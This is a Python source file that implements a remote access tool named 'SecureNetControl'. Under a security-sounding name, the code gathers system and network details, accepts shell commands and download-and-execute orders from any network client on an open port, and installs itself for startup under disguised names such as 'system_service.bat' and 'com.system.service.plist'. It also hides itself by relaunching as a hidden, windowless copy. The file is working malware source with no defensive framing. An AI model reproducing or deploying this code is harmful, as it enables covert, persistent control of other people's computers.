import os
import sys
import socket
import platform
import subprocess
import base64
import json
import random
import string
import time
import shutil
import threading
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import urllib.request
import ctypes
import getpass

class SecureNetControl:
    def __init__(self, encryption_key=None):
        """Initialize the SecureNetControl with optional encryption key"""
        self.system_info = self.get_system_info()
        self.network_info = self.get_network_info()

        # Generate encryption key if not provided
        if encryption_key is None:
            self.encryption_key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)).encode()
        else:
            self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key

        # For self-starting functionality
        self.startup_locations = {
            'windows': f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
            'linux': f'/home/{getpass.getuser()}/.config/autostart',
            'darwin': f'/Users/{getpass.getuser()}/Library/LaunchAgents'
        }

    def get_system_info(self):
        """Collect detailed system information"""
        system_info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'python_version': sys.version,
            'boot_time': psutil.boot_time(),
            'cpu_count': psutil.cpu_count(),
            'cpu_percent': psutil.cpu_percent(interval=1, percpu=True),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'disk_usage': {disk.mountpoint: {'total': disk.total, 'used': disk.used, 'free': disk.free} 
                           for disk in psutil.disk_partitions() if os.path.exists(disk.mountpoint)},
            'running_as_admin': self._check_admin_privileges()
        }
        return system_info

    def _check_admin_privileges(self):
        """Check if the script is running with administrative privileges"""
        try:
            if platform.system() == 'Windows':
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

    def get_network_info(self):
        """Collect network information"""
        network_info = {
            'ip_addresses': {},
            'active_connections': [],
            'hostname': socket.gethostname()
        }

        # Get IP addresses for all interfaces
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                network_info['ip_addresses'][interface] = []
                for addr in addrs:
                    if addr.family == socket.AF_INET:  # IPv4
                        network_info['ip_addresses'][interface].append(addr.address)
        except:
            pass

        # Get active connections
        try:
            connections = psutil.net_connections()
            for conn in connections:
                if conn.status == 'ESTABLISHED':
                    network_info['active_connections'].append({
                        'local_address': conn.laddr.ip,
                        'local_port': conn.laddr.port,
                        'remote_address': conn.raddr.ip if conn.raddr else None,
                        'remote_port': conn.raddr.port if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
        except:
            pass

        return network_info

    def encrypt_data(self, data):
        """Encrypt data using AES encryption"""
        if isinstance(data, dict) or isinstance(data, list):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode()

        cipher = AES.new(self.encryption_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return json.dumps({'iv': iv, 'ciphertext': ct})

    def decrypt_data(self, encrypted_data):
        """Decrypt data using AES encryption"""
        if isinstance(encrypted_data, str):
            encrypted_data = json.loads(encrypted_data)

        iv = base64.b64decode(encrypted_data['iv'])
        ct = base64.b64decode(encrypted_data['ciphertext'])
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)

        try:
            return json.loads(pt.decode('utf-8'))
        except:
            return pt.decode('utf-8')

    def execute_command(self, command, timeout=30):
        """Execute a system command and return the output"""
        try:
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            stdout, stderr = process.communicate(timeout=timeout)
            return {
                'stdout': stdout,
                'stderr': stderr,
                'return_code': process.returncode
            }
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                'error': 'Command timed out after {} seconds'.format(timeout),
                'return_code': -1
            }
        except Exception as e:
            return {
                'error': str(e),
                'return_code': -1
            }

    def download_file(self, url, destination=None):
        """Download a file from a URL"""
        try:
            if not destination:
                # Create a temp filename if none provided
                destination = os.path.join(
                    os.environ.get('TEMP', '/tmp'),
                    ''.join(random.choice(string.ascii_letters) for _ in range(10))
                )

            urllib.request.urlretrieve(url, destination)
            return {
                'success': True,
                'file_path': destination
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def execute_file(self, file_path, arguments=None):
        """Execute a downloaded file"""
        if not os.path.exists(file_path):
            return {
                'success': False,
                'error': f'File not found: {file_path}'
            }

        cmd = file_path
        if arguments:
            cmd += ' ' + arguments

        try:
            if platform.system() == 'Windows' and file_path.endswith('.exe'):
                # Execute Windows executable
                result = self.execute_command(cmd)
            elif file_path.endswith('.py'):
                # Execute Python script
                result = self.execute_command(f'{sys.executable} {cmd}')
            elif platform.system() != 'Windows' and os.access(file_path, os.X_OK):
                # Execute Linux/Mac executable
                result = self.execute_command(cmd)
            else:
                return {
                    'success': False,
                    'error': f'Cannot determine how to execute {file_path}'
                }

            return {
                'success': True,
                'execution_result': result
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def manage_processes(self, action='list', pid=None):
        """
        Control task managers and processes
        Actions: list, kill, info
        """
        try:
            if action == 'list':
                processes = []
                for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent']):
                    processes.append(proc.info)
                return {
                    'success': True,
                    'processes': processes
                }
            elif action == 'kill' and pid:
                process = psutil.Process(pid)
                process.terminate()
                return {
                    'success': True,
                    'message': f'Process {pid} terminated'
                }
            elif action == 'info' and pid:
                process = psutil.Process(pid)
                return {
                    'success': True,
                    'process_info': {
                        'pid': process.pid,
                        'name': process.name(),
                        'status': process.status(),
                        'created_time': process.create_time(),
                        'cpu_percent': process.cpu_percent(),
                        'memory_info': process.memory_info()._asdict(),
                        'num_threads': process.num_threads(),
                        'username': process.username(),
                        'exe': process.exe()
                    }
                }
            else:
                return {
                    'success': False,
                    'error': f'Invalid action: {action}'
                }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def install_self_startup(self):
        """Install the program to run at system startup"""
        try:
            os_type = platform.system().lower()

            if os_type not in self.startup_locations:
                return {
                    'success': False,
                    'error': f'Unsupported OS for self-startup: {os_type}'
                }

            # Get the path of the current script
            current_script = os.path.abspath(sys.argv[0])
            startup_folder = self.startup_locations[os_type]

            # Create the startup folder if it doesn't exist
            os.makedirs(startup_folder, exist_ok=True)

            if os_type == 'windows':
                # Create a batch file to run the script at startup
                startup_file = os.path.join(startup_folder, 'system_service.bat')
                with open(startup_file, 'w') as file:
                    file.write(f'@echo off\npythonw.exe "{current_script}"')
            elif os_type == 'linux':
                # Create a desktop entry for Linux
                startup_file = os.path.join(startup_folder, 'secure_net_control.desktop')
                with open(startup_file, 'w') as file:
                    file.write(f"""[Desktop Entry]
Type=Application
Name=System Service
Exec=python3 {current_script}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
                os.chmod(startup_file, 0o755)  # Make executable
            elif os_type == 'darwin':
                # Create a property list file for macOS
                startup_file = os.path.join(startup_folder, 'com.system.service.plist')
                with open(startup_file, 'w') as file:
                    file.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{current_script}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")

            return {
                'success': True,
                'startup_file': startup_file
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def self_hide(self):
        """Hide the process/file from normal view"""
        try:
            os_type = platform.system().lower()
            current_script = os.path.abspath(sys.argv[0])
            hidden_name = f".{os.path.basename(current_script)}" if os_type != 'windows' else f"_{os.path.basename(current_script)}"

            # Get the directory of the current script
            script_dir = os.path.dirname(current_script)
            hidden_path = os.path.join(script_dir, hidden_name)

            # Copy the script to the hidden location
            shutil.copy2(current_script, hidden_path)

            if os_type == 'windows':
                # Set hidden attribute on Windows
                self.execute_command(f'attrib +h "{hidden_path}"')

            # If we're on this script, restart the hidden version and exit this one
            if os.path.samefile(current_script, sys.argv[0]):
                # Start the hidden script in a separate process
                if os_type == 'windows':
                    subprocess.Popen([sys.executable, hidden_path], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen([sys.executable, hidden_path], start_new_session=True)

                # Exit the current script
                sys.exit(0)

            return {
                'success': True,
                'hidden_path': hidden_path
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def start_secure_server(self, port=8888):
        """Start a secure server that accepts encrypted commands"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(5)

            # Start a thread to handle connections
            server_thread = threading.Thread(target=self._handle_connections, args=(server_socket,), daemon=True)
            server_thread.start()

            return {
                'success': True,
                'message': f'Server started on port {port}',
                'thread': server_thread
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def _handle_connections(self, server_socket):
        """Handle incoming connections to the secure server"""
        while True:
            try:
                client_socket, address = server_socket.accept()
                client_thread = threading.Thread(target=self._handle_client, args=(client_socket, address), daemon=True)
                client_thread.start()
            except Exception as e:
                print(f"Connection error: {e}")

    def _handle_client(self, client_socket, address):
        """Handle individual client connections and process commands"""
        try:
            # Receive data from client
            data = client_socket.recv(4096)
            if not data:
                return

            # Try to decrypt the received data
            try:
                decrypted_data = self.decrypt_data(data.decode('utf-8'))
                command = json.loads(decrypted_data) if isinstance(decrypted_data, str) else decrypted_data
            except:
                # If decryption fails, use raw data
                command = json.loads(data.decode('utf-8'))

            # Process the command
            response = self._process_command(command)

            # Encrypt and send the response
            encrypted_response = self.encrypt_data(response)
            client_socket.send(encrypted_response.encode('utf-8'))
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client_socket.close()

    def _process_command(self, command):
        """Process received commands and return results"""
        try:
            if 'action' not in command:
                return {'error': 'No action specified'}

            action = command['action'].lower()

            if action == 'system_info':
                return {'success': True, 'data': self.get_system_info()}

            elif action == 'network_info':
                return {'success': True, 'data': self.get_network_info()}

            elif action == 'execute_command':
                if 'command' not in command:
                    return {'error': 'No command specified'}
                timeout = command.get('timeout', 30)
                return {'success': True, 'data': self.execute_command(command['command'], timeout)}

            elif action == 'download_file':
                if 'url' not in command:
                    return {'error': 'No URL specified'}
                destination = command.get('destination')
                return {'success': True, 'data': self.download_file(command['url'], destination)}

            elif action == 'execute_file':
                if 'file_path' not in command:
                    return {'error': 'No file path specified'}
                arguments = command.get('arguments')
                return {'success': True, 'data': self.execute_file(command['file_path'], arguments)}

            elif action == 'manage_processes':
                process_action = command.get('process_action', 'list')
                pid = command.get('pid')
                return {'success': True, 'data': self.manage_processes(process_action, pid)}

            elif action == 'install_startup':
                return {'success': True, 'data': self.install_self_startup()}

            elif action == 'hide':
                return {'success': True, 'data': self.self_hide()}

            else:
                return {'error': f'Unknown action: {action}'}

        except Exception as e:
            return {'error': str(e)}

def main():
    """Main function to demonstrate usage"""
    secure_control = SecureNetControl()

    # Example: Start a secure server
    server_result = secure_control.start_secure_server(port=8889)
    print(f"Server started: {server_result['success']}")

    # Keep the main thread running
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("Shutting down...")
            break

if __name__ == "__main__":
    main()

